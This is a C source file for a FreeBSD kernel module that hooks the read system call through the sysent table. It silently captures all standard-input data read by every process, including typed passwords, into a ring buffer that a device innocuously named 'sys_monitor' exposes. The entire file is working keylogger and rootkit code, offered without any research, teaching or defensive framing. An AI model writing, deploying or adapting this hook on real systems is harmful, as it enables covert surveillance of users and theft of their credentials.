#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/kernel.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/conf.h>
#include <sys/uio.h>

#define RING_SIZE 2048
#define STAGE_SIZE 256

static char ring_buffer[RING_SIZE];
static unsigned int head = 0;
static unsigned int tail = 0;
static struct mtx ring_mtx;

static sy_call_t *old_read = NULL;
static struct cdev *monitor_dev = NULL;

/* Character Device Prototypes */
static d_open_t monitor_open;
static d_read_t monitor_read;

static struct cdevsw monitor_cdevsw = {
	.d_version = D_VERSION,
	.d_open    = monitor_open,
	.d_read    = monitor_read,
	.d_name    = "sys_monitor",
};

static int
monitor_open(struct cdev *dev, int oflags, int devtype, struct thread *td)
{
	return (0);
}

static int
monitor_read(struct cdev *dev, struct uio *uio, int ioflag)
{
	char local_buf[STAGE_SIZE];
	size_t n;
	int error = 0;

	while (uio->uio_resid > 0) {
		n = 0;

		mtx_lock(&ring_mtx);
		while (tail != head && n < sizeof(local_buf)) {
			local_buf[n++] = ring_buffer[tail];
			tail = (tail + 1) % RING_SIZE;
		}
		mtx_unlock(&ring_mtx);

		if (n == 0)
			break;

		/* uiomove can fault/sleep, so copy out without holding ring_mtx */
		error = uiomove(local_buf, n, uio);
		if (error != 0)
			return (error);
	}

	return (0);
}

static int
read_hook(struct thread *td, void *syscall_args)
{
	struct read_args *uap = (struct read_args *)syscall_args;
	char local_in[STAGE_SIZE];
	int error;

	error = (*old_read)(td, syscall_args);
	if (error != 0 || uap->nbyte == 0 || uap->fd != 0)
		return (error);

	if (td->td_retval[0] <= 0)
		return (error);

	size_t actual_bytes = (size_t)td->td_retval[0];
	size_t offset = 0;

	while (offset < actual_bytes) {
		size_t chunk = actual_bytes - offset;
		if (chunk > sizeof(local_in))
			chunk = sizeof(local_in);

		error = copyin((const char *)uap->buf + offset, local_in, chunk);
		if (error != 0)
			break;

		mtx_lock(&ring_mtx);
		for (size_t i = 0; i < chunk; i++) {
			unsigned int next_head = (head + 1) % RING_SIZE;
			if (next_head == tail) {
				/* Ring buffer full; drop oldest byte or stop pushing */
				break;
			}
			ring_buffer[head] = local_in[i];
			head = next_head;
		}
		mtx_unlock(&ring_mtx);

		offset += chunk;
	}

	return (0);
}

static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		mtx_init(&ring_mtx, "ring_buffer_lock", NULL, MTX_DEF);
		old_read = sysent[SYS_read].sy_call;
		sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
		monitor_dev = make_dev(&monitor_cdevsw, 0, UID_ROOT, GID_WHEEL,
		    0600, "sys_monitor");
		if (monitor_dev == NULL) {
			sysent[SYS_read].sy_call = old_read;
			mtx_destroy(&ring_mtx);
			error = ENOMEM;
		}
		break;
	case MOD_UNLOAD:
		sysent[SYS_read].sy_call = old_read;
		if (monitor_dev != NULL) {
			destroy_dev(monitor_dev);
			monitor_dev = NULL;
		}
		mtx_destroy(&ring_mtx);
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}

	return (error);
}

static moduledata_t read_hook_mod = {
	"read_hook",
	load,
	NULL
};

DECLARE_MODULE(read_hook, read_hook_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);